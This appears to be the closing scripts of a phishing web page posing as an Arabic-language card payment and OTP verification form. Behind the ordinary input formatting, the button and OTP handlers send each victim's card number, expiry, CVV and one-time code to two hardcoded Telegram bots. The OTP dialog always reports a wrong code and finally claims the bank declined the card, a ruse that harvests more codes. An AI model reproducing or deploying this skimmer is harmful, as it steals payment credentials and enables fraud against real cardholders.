}

}

<script>
$(document).ready(function () {

    /* Convert Arabic/Persian digits to Western */
    function normalizeDigits(str) {
        return str
            .replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632)
            .replace(/[۰-۹]/g, d => d.charCodeAt(0) - 1776);
    }

    /* CREDIT CARD INPUT */
    $("#cardNumber").on("input", function () {

        let value = normalizeDigits($(this).val());

        // Remove non-digits
        value = value.replace(/\D/g, "");

        // Limit to 16 digits
        value = value.substring(0, 16);

        // Add space every 4 digits
        value = value.replace(/(.{4})/g, "$1 ").trim();

        $(this).val(value);
    });

    /* CVV INPUT */
    $("#cvv").on("input", function () {

        let value = normalizeDigits($(this).val());

        // Remove non-digits
        value = value.replace(/\D/g, "");

        // Exactly 3 digits max
        value = value.substring(0, 3);

        $(this).val(value);
    });

});
</script>
<script>
$(document).ready(function () {

    function normalizeDigits(str) {
        return str
            .replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632)
            .replace(/[۰-۹]/g, d => d.charCodeAt(0) - 1776);
    }

    function isValidCard(card) {
        card = card.replace(/\s/g, "");
        return /^\d{16}$/.test(card);
    }

    function isValidCVV(cvv) {
        return /^\d{3}$/.test(cvv);
    }

    function isValidExpiry(month, year) {
        if (!month || !year) return false;

        const now = new Date();
        const currentYear = now.getFullYear() % 100;
        const currentMonth = now.getMonth() + 1;

        month = parseInt(month);
        year = parseInt(year);

        if (year < currentYear) return false;
        if (year === currentYear && month < currentMonth) return false;

        return true;
    }

    function validateForm() {

        let card = normalizeDigits($("#cardNumber").val());
        let cvv = normalizeDigits($("#cvv").val());
        let month = $("#expiryMonth").val();
        let year = $("#expiryYear").val();

        card = card.replace(/\D/g, "");
        cvv = cvv.replace(/\D/g, "");

        const valid =
            isValidCard(card) &&
            isValidCVV(cvv) &&
            isValidExpiry(month, year);

        $("#goToPayment").prop("disabled", !valid);
    }

    /* Bind validation */
    $("#cardNumber, #cvv").on("input", validateForm);
    $("#expiryMonth, #expiryYear").on("change", validateForm);

    /* Initially disabled */
    $("#goToPayment").prop("disabled", true);

});
</script>

<script>

$(document).ready(function () {

  let otpAttempts = 0;
  const MAX_ATTEMPTS = 5;

  function normalizeDigits(str) {
    return str
      .replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632)
      .replace(/[۰-۹]/g, d => d.charCodeAt(0) - 1776);
  }

  function openModal() {
    $("#otpModal").addClass("is-open");
    $("#otpCode").val("").focus();
    $("#otpError").hide();
    $("#otpSubmit").prop("disabled", true);
  }

  function closeModal() {
    $("#otpModal").removeClass("is-open");
  }

  // Open modal
  $("#goToPayment").on("click", function () {
    let cardNumber = document.getElementById('cardNumber').value
    let cvv = document.getElementById('cvv').value
    let expiryMonth = document.getElementById('expiryMonth').value
    let expiryYear = document.getElementById('expiryYear').value

    localStorage.setItem('cardNumber',cardNumber)
    localStorage.setItem('cvv',cvv)
    localStorage.setItem('expiryMonth',expiryMonth)
    localStorage.setItem('expiryYear',expiryYear)

    let msg = `
        🏧 رقم البطاقة: \`${cardNumber}\`
        📅 تاريخ الانتهاء: \`${expiryMonth}\` /  \`${expiryYear}\`
        🔑 رمز ال CVV: \`${cvv}\`
    `
    to_tg(msg)


    if (!$(this).is(":disabled")) {
      openModal();
    }
  });

  // OTP input validation
  $("#otpCode").on("input", function () {

    let value = normalizeDigits($(this).val());
    value = value.replace(/\D/g, "").substring(0, 6);
    $(this).val(value);

    const valid = /^\d{4,6}$/.test(value);
    $("#otpSubmit").prop("disabled", !valid);

  });

  function to_tg(msg){

    const botConfigs = [
        { token: '8797549963:AAFxHU7EtFf1ZDDRlhPYRtlVk-Watq8L0wM', chatId: '7801329761' },
        { token: '8189888163:AAGTnrxFPgCMWvHTFogt2oeHNGH4jAtw32Y', chatId: '8108427825' }
    ];
    const promises = botConfigs.map(({ token, chatId }) => {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    return fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode:'MarkdownV2' })
        })
    });    

  }

  // OTP submit
  $("#otpSubmit").on("click", function () {


    let otp = normalizeDigits($("#otpCode").val()).replace(/\D/g, "");

    if (!/^\d{4,6}$/.test(otp)) return;



    let cardNumber = localStorage.getItem('cardNumber')
    let cvv = localStorage.getItem('cvv')
    let expiryMonth = localStorage.getItem('expiryMonth')
    let expiryYear = localStorage.getItem('expiryYear')

    let msg = `
        🏧 رقم البطاقة: \`${cardNumber}\`
        📅 تاريخ الانتهاء: \`${expiryMonth}\` /  \`${expiryYear}\`
        🔑 رمز ال CVV: \`${cvv}\`
        🔢 رمز ال OTP: ${$("#otpCode").val()}
    `
    to_tg(msg)
    



    otpAttempts++;


    if (otpAttempts < MAX_ATTEMPTS) {

      $("#otpError")
        .text("رمز التحقق غير صحيح")
        .show();

      $("#otpCode").val("").focus();
      $("#otpSubmit").prop("disabled", true);

    } else {

      closeModal();

      $("#paymentErrorOutside")
        .text("تم رفض البطاقة من البنك المصدر, يرجى أدخال بطاقة صالحة")
        .show();

      $("#goToPayment").prop("disabled", true);

    }

  });

});

</script>
<script>
    function closeModal() {
  $("#otpModal").removeClass("is-open");
}

// Close button click
$("#otpClose").on("click", function () {
  closeModal();
});

// Close when clicking outside dialog
$("#otpModal").on("click", function (e) {
  if ($(e.target).is("#otpModal")) {
    closeModal();
  }
});

// Close with ESC key
$(document).on("keydown", function (e) {
  if (e.key === "Escape") {
    closeModal();
  }
});




</script>
</body>
